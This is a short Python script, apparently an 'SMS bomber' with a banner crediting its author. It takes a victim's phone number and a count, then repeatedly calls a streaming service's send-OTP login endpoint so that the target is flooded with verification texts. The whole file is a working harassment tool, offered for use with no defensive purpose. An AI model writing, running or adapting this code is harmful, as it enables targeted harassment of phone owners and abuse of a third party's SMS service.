import os
from  urllib  import  request
import time

os.system('clear')

print("""
 ██████╗░██╗░░░░░░░██╗░█████╗░██████╗░░█████╗░███╗░░██╗
██╔════╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗████╗░██║
╚█████╗░░╚██╗████╗██╔╝███████║██████╔╝██║░░██║██╔██╗██║
░╚═══██╗░░████╔═████║░██╔══██║██╔═══╝░██║░░██║██║╚████║
██████╔╝░░╚██╔╝░╚██╔╝░██║░░██║██║░░░░░╚█████╔╝██║░╚███║
╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░░░░░╚════╝░╚═╝░░╚══╝
#######################################################
Name      : Stbm                             
Developer : Md Swapon Mia
Github    : @Swapon-Vau
Youtube   : https://m.youtube.com/TechnologyBoy
Facebook  : https://www.facebook.com/Swapon06
version   : 1.0
#######################################################
""")

phone=input("Enter Phone  number :")
sms=int(input("SMS quantity :" ))

url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"

for a in range(sms):
	request.urlopen(url)
	print(str(a+1)+ "sms send ") 
	time.sleep(30)
